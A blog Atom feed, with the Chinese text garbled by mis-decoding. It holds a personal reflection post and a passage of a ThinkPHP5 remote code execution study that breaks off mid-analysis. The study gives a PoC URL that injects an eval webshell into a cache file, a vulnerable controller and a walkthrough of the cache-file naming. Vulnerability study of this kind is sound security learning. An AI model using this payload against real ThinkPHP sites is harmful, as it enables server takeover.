<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>å¯æƒœæ²¡å¦‚æœã€m0nk3yâ€˜s Blog</title>
  
  
  <link href="https://hack-for.fun/atom.xml" rel="self"/>
  
  <link href="https://hack-for.fun/"/>
  <updated>2020-10-08T07:06:49.848Z</updated>
  <id>https://hack-for.fun/</id>
  
  <author>
    <name>m0nk3y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æœ€è¿‘ä¸€ç‚¹æ€è€ƒã€ä¹Ÿå¯ä»¥æ˜¯æ‚è°ˆ</title>
    <link href="https://hack-for.fun/3d90.html"/>
    <id>https://hack-for.fun/3d90.html</id>
    <published>2020-10-08T06:30:18.000Z</published>
    <updated>2020-10-08T07:06:49.848Z</updated>
    
    <content type="html"><![CDATA[<p>å­¦ä¸šï¼šå­¦æ ¡çš„è¯¾ç¨‹ã€æˆ‘é™¤äº†ä¸èƒ½é€ƒçš„è¯¾æˆ‘å‡ ä¹éƒ½åœ¨é€ƒè¯¾ã€‚æ•°æ®ç»“æ„ã€Javaã€æ•°æ®åº“æˆ‘åŸºæœ¬éƒ½é€ƒäº†ã€åªæœ‰è‹±è¯­å’Œæ¨¡ç”µæˆ‘é€ƒä¸äº†ã€‚æˆ‘æ‹…å¿ƒæŒ‚ç§‘ã€æ‹…å¿ƒé€ƒè¯¾è¢«æŠ“ã€æ‹…å¿ƒè¢«ç¦è€ƒã€‚æ¯å½“çœ‹åˆ°åŒå­¦å®Œæˆæ•°æ®ç»“æ„å·¦å³ï¼Œç”¨Cè¯­è¨€å†™äº†å‡ ç™¾è¡Œä»£ç çš„æ—¶å€™ã€å»å¼„æ‡‚ä¸€ä¸ªé“¾è¡¨çš„é¡ºåºç»“æ„ã€åˆ é™¤ä¹‹ç±»çš„çŸ¥è¯†ï¼Œæˆ‘å¿ƒé‡Œé’¦ä½©ä»–ä»¬ã€‚çœ‹åˆ°åŒå­¦ç”¨Javaéšä¾¿å†™å°±æ˜¯å‡ ç™¾è¡Œçš„ä»£ç ã€è€Œæˆ‘ï¼Œå°±åªä¼šå‡ ä¸ªåŸºæœ¬çš„ä»£ç ã€‚è™½ç„¶æˆ‘ä»¬æ˜¯ä¿¡æ¯å®‰å…¨ä¸“ä¸šï¼Œä½†æ˜¯ç¼–ç¨‹èƒ½åŠ›ç¡®å®æ˜¯éå¸¸é‡è¦çš„ï¼Œè€Œæˆ‘ç¼–ç¨‹æ˜¯çœŸçš„åƒåœ¾ã€‚</p><p>çˆ±æƒ…ï¼šæœ€è¿‘æ˜¯å‘¨å›´åŒå­¦ä»¬è„±å•çš„é«˜å³°æœŸã€‚å¥½å‡ ä¸ªåŒå­¦éƒ½è„±å•äº†ï¼Œå½“ç„¶åˆ«äººæ„Ÿæƒ…ä¹‹æ—…è¯´ä¸å®šæ˜¯ä»ä¸Šå­¦æœŸæˆ–è€…ä»€ä¹ˆä¸çŸ¥é“å¤šæ—©å°±å·²ç»å¼€å§‹äº†ã€‚èº«è¾¹ä¹Ÿæœ‰åŒå­¦åœ¨é¼“åŠ±æˆ‘å»è°ˆæ‹çˆ±ï¼Œå»æ‰¾ä¸€ä¸ªåˆé€‚çš„äººï¼Œè¯šç„¶ï¼Œè¿™é‡Œç¡®å®æœ‰ä¸€ä¸ªæˆ‘è®¤ä¸ºæ¯”è¾ƒåˆé€‚çš„äººã€‚ä½†æ˜¯æˆ‘è§‰å¾—è¿˜æ˜¯ç®—äº†ï¼Œé¡ºå…¶è‡ªç„¶ã€‚ä½†æ˜¯ï¼Œç¡®å®ï¼Œæœ‰ç‚¹æ„Ÿè§‰å°±åº”è¯¥å°è¯•ï¼Œä¸æ˜¯å—ï¼Ÿ</p><p>äº‹ä¸šï¼šä¸€å¥è¯ï¼Œæ²¡æŠ€æœ¯æ²¡é’±ã€‚æŠ€æœ¯å¤ªèœã€æ‰“CTFæ‰“ä¸å‡ºåæ¬¡(è™½ç„¶CTFä¸æ˜¯ä¸€ä¸ªäººèƒ½å†³å®šçš„ï¼Œä½†æ˜¯æˆ‘å¥½å·²ç»å¥½ä¹…æ²¡åœ¨CTFæ¯”èµ›ä¸­èƒ½è¾“å‡ºå¾ˆå¤šåˆ†æ•°äº†ã€‚)ã€SRCæ¼æ´æŒ–æ˜ï¼ˆè¿™ä¸ªæ˜¯ç›´æ¥å¯ä»¥æŒ–åˆ°ğŸ’°çš„ã€‚ï¼Œç„¶è€Œç›®å‰ï¼Œæˆ‘ä¸€æ¯›é’±éƒ½æ²¡æŒ–åˆ°ã€‚ï¼‰</p><p>å®¶åº­ï¼šå›½åº†èŠ‚å…¶å®ä»å®¶é‡Œèµ°çš„æ—¶å€™ï¼Œè¿˜å’Œçˆ¸å¦ˆå°åµäº†ä¸€ä¸‹ã€‚è¿˜æ˜¯é‚£äº›å°äº‹ï¼Œç®—äº†ä¸è¯´äº†ã€‚æ”¹å˜è‡ªå·±ã€æå‡è‡ªå·±ï¼Œç›®å‰è¿˜ä¸èƒ½æ”¹å˜çš„ä¸œè¥¿å°±å…ˆæ”¾ç€ã€‚</p><p>å­¦ä¸šã€çˆ±æƒ…ã€äº‹ä¸šã€å®¶åº­ï¼Œä½•å°ä¸æ˜¯ä¸€ä¸ªæˆå¹´ç”·äººæˆå®¶ç«‹ä¸šæ‰€è€ƒè™‘çš„äº‹å—ï¼Ÿæˆ‘ä»–å¦ˆè¿˜åªæ˜¯ä¸€ä¸ª20å‡ºå¤´çš„å¤§å­¦ç”Ÿï¼Œä¸è¿‡ç¡®å®ä¹Ÿè¯¥ä¸ºæœªæ¥è€ƒè™‘äº†ï¼Œéš¾é“ç­‰ä»¥åæ¯•ä¸šäº†å†æ¥è§„åˆ’ï¼Ÿ</p><hr><p>æˆ‘å¸¸å¸¸è®¤ä¸ºæˆ‘æƒ³åˆ°å¤ªå¤šäº†ï¼Œç¼ºæ²¡æœ‰è¯¦ç»†çš„è§„åˆ’ï¼Œè®¡åˆ’èµ¶ä¸ä¸Šå˜åŒ–ã€‚</p><p>è·ç¦»ä»Šå¹´ç»“æŸè¿˜æœ‰84å¤©ã€å¤§äºŒä¸Šå­¦æœŸç»“æŸè¿˜æœ‰110å¤©ã€‚å¦‚ä½•åˆ©ç”¨å¥½è¿™ä¸‰ä¸ªå¤šæœˆæ—¶é—´ï¼Œéå¸¸å…³é”®ã€‚è¿™ç›´æ¥å†³å®šäº†æˆ‘åé¢æ¥é¡¹ç›®èµšé’±ã€SRCæŒ–æ´ã€CTFæ¯”èµ›ã€å¤§äºŒæš‘å‡å®ä¹ ã€‚</p><hr><p>å…¶å®ä¸€ä¸ªäººçš„ç²¾åŠ›æ˜¯æœ‰é™çš„ã€‚ä¸å¯èƒ½é¢é¢ä¿±åˆ°ã€æˆ‘æš‘å‡åœ¨é•¿äº­å®ä¹ ä¸€ä¸ªå¸ˆå‚…CTFè²Œä¼¼å°±æ²¡å¾—è¿‡å¤šå°‘å¥–ï¼Œä½†æ˜¯åˆ«äººæŒ–æ´å‰å®³ï¼Œä¸€æ ·èƒ½è¿›å¤§å‚å®ä¹ ã€åæ¥ä¹Ÿè½¬æ­£çš„ã€‚æˆ‘è§‰å¾—æˆ‘ä¸é€‚åˆæå®‰å…¨ç ”ç©¶ã€å¯¹ä¸€ä¸ªè¿‡æ»¤çš„ç»•è¿‡ç ”ç©¶ä¸€ä¸¤å¤©ã€ä¸»è¦è¿˜æ˜¯æ²¡è€å¿ƒï¼Œä½†æ˜¯å®‰å…¨è¿™ä¸ªè¡Œä¸šè¦çš„å°±æ˜¯æœ‰è€å¿ƒã€å¯èƒ½æ˜¯çœ‹åˆ°å¤ªå¤šäººæŒ£é’±å¤ªå®¹æ˜“ï¼Œå½“ç„¶ä¹Ÿåªæ˜¯çœ‹åˆ°ä»–ä»¬çš„è¡¨é¢ï¼Œæœ¬è´¨ä¸Šå“ªäº›äººæ¯å¤©ç†¬åˆ°å‡Œæ™¨ä¸¤ä¸‰ç‚¹ï¼Œéƒ½ä¸å®¹æ˜“ã€‚</p><hr><p>æœ€è¿‘ï¼Œä¹Ÿåœ¨è¿åŠ¨ï¼Œå…‰å›½åº†èŠ‚æœŸé—´ä¸ç®—ä»Šå¤©ï¼Œæˆ‘ç´¯è®¡è·‘æ­¥éƒ½20å¤šå…¬é‡Œäº†ï¼Œè·‘äº†4æ¬¡5å…¬é‡Œï¼Œæ¯æ¬¡åŠä¸ªå°æ—¶ã€‚èº«ä½“æ˜æ˜¾æ„Ÿè§‰åˆ°æ›´æœ‰ç²¾ç¥äº†ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æ”¹ä¸äº†ç†¬å¤œå’Œèººåœ¨åºŠä¸Šç©æ‰‹æœºï¼Œå¯¼è‡´æˆ‘çš„çœ¼ç›å¾ˆç–²æƒ«ã€ä¹Ÿåœ¨é•¿ç—˜ç—˜ã€‚è¿™ä¸ªç—˜ç—˜çœŸä»–å¦ˆå¥‡æ€ªï¼Œæ¯æ¬¡åœ¨å®¶ä¸é•¿ï¼Œåˆ°å­¦æ ¡å°±é•¿ç—˜ç—˜ã€‚</p><p>å¸Œæœ›èƒ½åšæŒè¿åŠ¨å§ï¼Œæ¯å¤©å°±è·‘æ­¥åŠä¸ªå°æ—¶ï¼Œå½“ç„¶ä¹Ÿä¸å¯èƒ½æ¯å¤©ï¼Œä¸­é—´ä¼‘æ¯ä¸€å¤©è¿˜æ˜¯å¯ä»¥çš„ï¼Œä¸‹é›¨å¤ªçƒ­å¤ªå†·éƒ½å¯ä»¥é€‰æ‹©çœ‹çœ‹ä¹¦ã€‚</p><p>æ˜¨å¤©æ™šä¸Šä¹Ÿå¼„äº†ä¸€ä¸ª2020å¹´å¹´åº¦æ¸…å•ã€å…¶å®åº”è¯¥æ—©ç‚¹å¼„ï¼Œ2021å¹´æˆ‘è¦åšæŒä¸‹å»ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201008145223.png" alt="image-20201008145222507"></p><hr><p>ç»§ç»­è¯´ä¸Šé¢è¯´åˆ°çš„ä¸€ä¸ªäººçš„ç²¾åŠ›æ˜¯æœ‰é™çš„ï¼Œé€‰æ‹©ä¸€ä¸ªæ–¹å‘å°±å»æ­»ç£•å§ã€‚CTFã€æˆ‘æ‰“ç®—æ”¾å¼ƒäº†ã€æœ‰æ¯”èµ›å°±æ‰“ï¼Œæ‰“ä¸å‡ºæ¥å°±ç®—äº†ã€‚</p><p>å¹³æ—¶çš„ä¸»è¦ç²¾åŠ›è¿˜æ˜¯æ”¾åœ¨æ¸—é€æµ‹è¯•ã€å†…ç½‘æ¸—é€è¿™è¾¹çš„å­¦ä¹ å’Œå®è·µä¸Šï¼š</p><ul><li>æ¸—é€é¶æœºï¼Œè‡³å°‘ä¸€å‘¨æ‰“ä¸€ä¸ª</li><li>SRCæŒ–æ´ã€EDUSRCç»§ç»­æŒ–ï¼ˆæŒ–æœ‰è¯ä¹¦çš„ï¼‰ã€ç„¶åæ…¢æ…¢å»æ··ç‚¹å…¶ä»–å¤§å‹SRCã€è¦æœ‰äº§å‡ºï¼Œä¸€å‘¨ä¸å¾—ä½äº2ä¸ªæ¼æ´ã€‚</li><li>æ¯å‘¨ä¸å°‘äºä¸‰ä¸ªçŸ¥è¯†ç‚¹å…³äºæ¸—é€æµ‹è¯•çš„</li></ul><hr><p>å…¶å®ï¼Œè¿™ç¯‡åšå®¢å°±æ˜¯æˆ‘å‘æ³„ä¸€ä¸‹è€Œå·²å•¦ã€‚è¥¿æ¹–è®ºå‰‘åˆä¸€æ¬¡å‘Šè¯‰æˆ‘ï¼Œä¸“æ³¨äºä¸€ä¸ªé¢†åŸŸï¼Œå¹¶äº§å‡ºã€ä¸€å®šè¦æœ‰äº§å‡ºã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201008145930.png" alt="image-20201008145928913"></p><p>BTWï¼Œåšå®¢ä»¥åå¯èƒ½å¾ˆå°‘æ›´æ–°æŠ€æœ¯æ–‡ç« äº†ã€‚å› ä¸ºæˆ‘ç”¨äº†Mwebï¼Œå°±éš¾å¾—å‘åšå®¢äº†ã€‚æˆ–è®¸ç­‰æˆ‘é‡åˆ°äº†æœ‰è¶£çš„ä¸œè¥¿æ¥åˆ†äº«ç»™è¿™ä¸ªä¸–ç•Œã€æˆ–è€…æˆ‘åˆæƒ³bbäº†å°±å†™ä¸€ç¯‡åšå®¢æ¥éª‚æˆ‘è‡ªå·±ã€‚</p><hr><p>æœ€åï¼Œæ¥ç‚¹é¸¡æ±¤ï¼Ÿ</p><blockquote><p>â€œæœ‰äº›äººå°±æ˜¯å®‰å®‰ç¨³ç¨³çš„è¯»å¤§å­¦ï¼Œä¸Šè¯¾ï¼Œä¸Šå®Œè¯¾å°±åœ¨å®¿èˆèººç€ï¼›</p><p>æ¯•ä¸šäº†å°±å‡ºå»æ‰¾ä¸€ä»½å®‰ç¨³çš„å·¥ä½œï¼Œä¸€åšå¥½å‡ å¹´ã€‚â€</p></blockquote><blockquote><p>è¿™è¡Œå¾ˆè¾›è‹¦ï¼Œä¸€æ—¶çš„é£å…‰èƒŒåä¼šæœ‰æ— æ•°ä¸ªå¤œæ™šçš„ä»˜å‡ºï¼Œå¦‚æœä½ ç¡®è®¤äº†çš„è¯ï¼Œé‚£å°±è¯·å­¦å¥½ï¼›ç°åœ¨å­¦è®¡ç®—æœºçš„éåœ°éƒ½æ˜¯ï¼›çŸ¥è¯†æ—¶åˆ»éƒ½åœ¨æ›´æ–°è¿­ä»£ï¼Œè¦ä¸åœçš„å­¦ä¹ ï¼Œæ²¡æœ‰èƒ½åŠ›çš„äººæ³¨å®šè¢«æ·˜æ±°ã€‚</p></blockquote><blockquote><p>å®‰å…¨å­¦ä¹ å¾ˆéš¾ï¼Œä½†ï¼Œå±±é¡¶å¾ˆé«˜ï¼Œå“ªæ€•å¤±è´¥äº†ï¼Œä¹Ÿè¯æ˜ä½ çˆ¬è¿‡äº†é«˜å±±ï¼Œè€Œä¸æ˜¯åœ¨åœŸä¸˜ä¸Šç™»é¡¶ã€‚åœŸä¸˜å®¹æ˜“è¢«é“²å¹³ï¼Œè€Œé«˜å±±ä¸ä¼šï¼Œä½ æŒ‘æˆ˜çš„ç›®æ ‡å°±æ˜¯ä½ æŒ‘æˆ˜çš„è§è¯ã€‚</p><p>è¿™æ˜¯é¸¡æ±¤è¿˜æ˜¯è­¦å¥ï¼Œå°±å–å†³äºä½ æœ‰æ²¡æœ‰è¡ŒåŠ¨ã€‚è®©é‚£äº›ä¸€ç¬‘è€Œè¿‡çš„äººæˆä¸ºå†å²çš„æ²™ç ¾å§ã€‚ä½ ã€æˆ‘ä¼šä¹¦å†™å†å²ã€‚â€“ æ¥è‡ªTokyå¸ˆå‚…åšå®¢ã€‚</p></blockquote><p>å“¦ï¼Œå¯¹äº†ï¼Œæˆ‘çš„ç©¶æç›®æ ‡æ˜¯å•¥ï¼Ÿ</p><blockquote><p>åŸºäºç°é»‘äº§çš„APTå¯¹æŠ—ï¼ˆäººï¼Œè¿˜æ˜¯è¦æœ‰ç‚¹å¹¿å¤§çš„ç›®æ ‡ï¼Œå“ªæ€•å®ç°ä¸äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ï¼‰</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å­¦ä¸šï¼šå­¦æ ¡çš„è¯¾ç¨‹ã€æˆ‘é™¤äº†ä¸èƒ½é€ƒçš„è¯¾æˆ‘å‡ ä¹éƒ½åœ¨é€ƒè¯¾ã€‚æ•°æ®ç»“æ„ã€Javaã€æ•°æ®åº“æˆ‘åŸºæœ¬éƒ½é€ƒäº†ã€åªæœ‰è‹±è¯­å’Œæ¨¡ç”µæˆ‘é€ƒä¸äº†ã€‚æˆ‘æ‹…å¿ƒæŒ‚ç§‘ã€æ‹…å¿ƒé€ƒè¯¾è¢«æŠ“ã€æ‹…å¿ƒè¢«ç¦è€ƒã€‚æ¯å½“çœ‹åˆ°åŒå­¦å®Œæˆæ•°æ®ç»“æ„å·¦å³ï¼Œç”¨Cè¯­è¨€å†™äº†å‡ ç™¾è¡Œä»£ç çš„æ—¶å€™ã€å»å¼„æ‡‚ä¸€ä¸ªé“¾è¡¨çš„é¡ºåºç»“æ„ã€åˆ é™¤ä¹‹ç±»çš„çŸ¥è¯†ï¼Œæˆ‘å¿ƒé‡Œé’¦ä½©ä»–ä»¬ã€‚çœ‹åˆ°</summary>
      
    
    
    
    <category term="æ€è€ƒæ‚è°ˆ" scheme="https://hack-for.fun/categories/%E6%80%9D%E8%80%83%E6%9D%82%E8%B0%88/"/>
    
    
    <category term="æ€è€ƒæ‚è°ˆ" scheme="https://hack-for.fun/tags/%E6%80%9D%E8%80%83%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5æ¼æ´å­¦ä¹ -RCE</title>
    <link href="https://hack-for.fun/a45.html"/>
    <id>https://hack-for.fun/a45.html</id>
    <published>2020-09-23T03:04:09.000Z</published>
    <updated>2020-09-27T13:39:21.764Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸»è¦å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/">https://github.com/Mochazz/ThinkPHP-Vuln/</a></p><h1 id="RCE1-åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE"><a href="#RCE1-åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE" class="headerlink" title="RCE1(åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE)"></a>RCE1(åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE)</h1><p>ç›¸å…³å‚è€ƒèµ„æ–™ï¼š<a href="https://www.cnblogs.com/zpchcbd/p/12546340.html">https://www.cnblogs.com/zpchcbd/p/12546340.html</a></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;thinkphp5:8888&#x2F;public&#x2F;?username&#x3D;test%0d%0a@eval($_GET[_]);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172609.png" alt="image-20200923114608784"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172619.png" alt="image-20200923124814752"></p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><blockquote><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> çš„ç¼“å­˜ç±»ä¸­ã€‚è¯¥ç±»ä¼šå°†ç¼“å­˜æ•°æ®é€šè¿‡åºåˆ—åŒ–çš„æ–¹å¼ï¼Œç›´æ¥å­˜å‚¨åœ¨ <code>.php</code> æ–‡ä»¶ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡ç²¾å¿ƒæ„é€ çš„ <strong>payload</strong> ï¼Œå³å¯å°† <strong>webshell</strong> å†™å…¥ç¼“å­˜æ–‡ä»¶ã€‚ç¼“å­˜æ–‡ä»¶çš„åå­—å’Œç›®å½•å‡å¯é¢„æµ‹å‡ºæ¥ï¼Œä¸€æ—¦ç¼“å­˜ç›®å½•å¯è®¿é—®æˆ–ç»“åˆä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå³å¯è§¦å‘ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong> ã€‚</p></blockquote><p>æ¼æ´åˆ©ç”¨å‰æï¼š</p><ul><li><p>ç«™ç‚¹èƒ½å¤Ÿå°†ç¼“å­˜æ–‡ä»¶åˆ—å‡ºï¼Œå¹¶ä¸”ç”¨æˆ·å¯ä»¥å¾—åˆ°è·¯å¾„</p></li><li><p>1ã€ç¼“å­˜ä½¿ç”¨æ–‡ä»¶æ–¹å¼å¹¶ä¸”ç¼“å­˜ç›®å½•æš´éœ²åœ¨webç›®å½•ä¸‹é¢<br>2ã€æ”»å‡»è€…è¦èƒ½çŒœåˆ°å¼€å‘è€…ä½¿ç”¨çš„ç¼“å­˜key</p></li><li><p>çŸ¥é“ç¼“å­˜ç±»æ‰€è®¾ç½®çš„é”®åï¼Œè¿™æ ·æ‰èƒ½æ‰¾åˆ° <strong>webshell</strong> è·¯å¾„ï¼›å…¶æ¬¡å¦‚æœæŒ‰ç…§å®˜æ–¹è¯´æ˜å¼€å‘ç¨‹åºï¼Œ <strong>webshell</strong> æœ€ç»ˆä¼šè¢«å†™åˆ° <strong>runtime</strong> ç›®å½•ä¸‹ï¼Œè€Œå®˜æ–¹æ¨è <strong>public</strong> ä½œä¸º <strong>web</strong> æ ¹ç›®å½•ï¼Œæ‰€ä»¥å³ä¾¿æˆ‘ä»¬å†™å…¥äº† <strong>shell</strong> ï¼Œä¹Ÿæ— æ³•ç›´æ¥è®¿é—®åˆ°ï¼›æœ€åå¦‚æœç¨‹åºæœ‰è®¾ç½® <strong>$this-&gt;options[â€˜prefixâ€™]</strong> çš„è¯ï¼Œåœ¨æ²¡æœ‰æºç çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ— æ³•è·å¾— <strong>webshell</strong> çš„å‡†ç¡®è·¯å¾„ã€‚</p></li><li><blockquote><p>5.0çš„éƒ¨ç½²å»ºè®®æ˜¯publicç›®å½•ä½œä¸ºwebç›®å½•è®¿é—®å†…å®¹ï¼Œå…¶å®ƒéƒ½æ˜¯webç›®å½•ä¹‹å¤–ï¼Œå½“ç„¶ï¼Œä½ å¿…é¡»è¦ä¿®æ”¹public/index.phpä¸­çš„ç›¸å…³è·¯å¾„</p></blockquote></li></ul><p>æ¯”å¦‚è¿™é‡Œä¿®æ”¹çš„index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Cache::set(<span class="string">&quot;name&quot;</span>,input(<span class="string">&quot;get.username&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Cache success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</strong></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨ThinkPHP çš„5.0.11 release ä¿¡æ¯ä¸­ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172420.png" alt="image-20200923125619050"></p><p>æ›´æ–°äº†å®Œå–„ç¼“å­˜é©±åŠ¨(å®‰å…¨æ›´æ–°)ã€‚å†å»æŸ¥çœ‹commitè®°å½•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><p>ä¿®å¤æ–¹å¼ä¸ºå°†ç¼“å­˜æ–‡ä»¶çš„å†…å®¹æ‹¼æ¥åˆ°<code>&lt;?php ?&gt;</code> æ ‡ç­¾ä¹‹å¤–ï¼Œå¹¶ä¸”ä½¿ç”¨äº†<code>exit()</code>å‡½æ•°æ¥é€€å‡ºå½“å‰è„šæœ¬ã€‚</p><p>å¯ä¸‹æ–­ç‚¹è¿›è¡Œå•æ­¥è°ƒè¯•ï¼Œè§‚å¯Ÿæ•´ä¸ªå‚æ•°åœ¨Cacheç±»ä»¥åŠRequestç±»ä¸‹è¿›è¿‡ç›¸å…³æ–¹æ³•çš„è¿‡æ»¤ï¼Œè½¬æ¢ï¼Œå¹¶æœ€ç»ˆå†™å…¥äº†ç¼“å­˜æ–‡ä»¶çš„è¿‡ç¨‹ã€‚</p><p>é¦–å…ˆæ˜¯<code>Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));</code> æœªå®ä¾‹åŒ–ï¼Œæ‰€ä»¥ä¸ºè°ƒç”¨<code>autoload</code>æ–¹æ³•ï¼Œè‡ªåŠ¨åŠ è½½æœºåˆ¶æ¥è¿›è¡Œä¸€ç³»åˆ—å®ä¾‹åŒ–æ“ä½œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172411.png" alt="image-20200923161825336"></p><p>ç„¶ååˆ°helper.php ä¸­çš„ <code>input</code>æ–¹æ³•ï¼Œåˆ¤æ–­è¯·æ±‚çš„æ–¹æ³•å’Œè¯·æ±‚çš„å‚æ•°ï¼Œæ­¤å¤„ä¸º<code>get.username</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172318.png" alt="image-20200923162505424"></p><p>ç„¶åè¿”å›è¿‡æ»¤åçš„å€¼ï¼Œç»§ç»­è°ƒç”¨<code>Request</code> ç±»çš„ <code>get</code> æ–¹æ³•å’Œ <code>Input</code> æ–¹æ³•ï¼ˆåœ¨TP5)ä¸­å‚æ•°çš„å¤„ç†éƒ½æ˜¯è¿™æ ·çš„äº†ï¼Œ</p><p>ç»è¿‡<code>filterVaule</code>å’Œ<code>filterExp</code>å‡½æ•°è¿›è¡Œç‰¹æ®Šå­—ç¬¦è¿‡æ»¤å’Œç›¸å…³åˆ¤æ®µåè¿”å›ç»™<code>$data</code></p><hr><p>ç„¶åæ¥åˆ°Cache ç±»çš„<code>set</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172308.png" alt="image-20200923164241136"></p><p>è°ƒç”¨äº†Cache ç±»çš„init æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº† Configé‡Œçš„getæ–¹æ³•ï¼Œè¿™äº›æ“ä½œæ˜¯åœ¨ä¸ºç¼“å­˜å†…å®¹åšä¸€äº›åˆå§‹åŒ–æ“ä½œã€‚ç„¶åå†åˆ°Cache ç±»çš„ connect æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172114.png" alt="image-20200923164824257"></p><p>ä¸ºç¼“å­˜æ–‡ä»¶çš„æ–‡ä»¶åè¿›è¡Œmd5è¿”å›ã€‚è¿™é‡Œçš„<code>self::handler</code>ä¸º<code>think\cache\driver\File</code>ç±»ã€‚æ‰€ä»¥ä¼šè°ƒç”¨<code>File</code>ç±»çš„<code>set</code>æ–¹æ³•ã€‚è¯¥æ–¹æ³•è°ƒç”¨äº†<code>getCacheKey</code>æ–¹æ³•æ¥è·å–ç¼“å­˜æ–‡ä»¶çš„æ–‡ä»¶åã€‚æ–‡ä»¶åçš„æœºåˆ¶å¦‚ä¸‹å›¾ï¼Œå…ˆæ˜¯å¯¹<code>$name</code> md5ï¼Œç„¶åæˆªå–å‰ä¸¤ä½ä½œä¸ºç›®å½•åï¼Œåé¢éƒ¨åˆ†ä½œä¸ºæ–‡ä»¶åç„¶åå’Œ<code>.php</code>åç¼€è¿›è¡Œæ‹¼æ¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172102.png" alt="image-20200923165836437"></p><p>çœ‹çœ‹setæ–¹æ³•çš„å¤„ç†æµç¨‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172037.png" alt="image-20200923170741256"></p><p>æœ€åé€šè¿‡<code>file_put_contents</code>å‡½æ•°ï¼Œå°†<code>$data</code>ï¼ˆå‚æ•°å†…å®¹å¯æ§ï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹dataå‚æ•°è¿›è¡Œä»»ä½•è¿‡æ»¤ç­‰æ“ä½œï¼Œåªæ˜¯åºåˆ—åŒ–åæ‹¼æ¥å­˜å‚¨åœ¨æ–‡ä»¶ä¸­ï¼Œè¿™é‡Œçš„ <strong>$this-&gt;options[â€˜data_compressâ€™]</strong> å˜é‡é»˜è®¤æƒ…å†µä¸‹ä¸º <strong>false</strong> ï¼Œæ‰€ä»¥æ•°æ®ä¸ä¼šç»è¿‡ <strong>gzcompress</strong> å‡½æ•°å¤„ç†ã€‚è™½ç„¶åœ¨åºåˆ—åŒ–æ•°æ®å‰é¢æ‹¼æ¥äº†å•è¡Œæ³¨é‡Šç¬¦ <strong>//</strong> 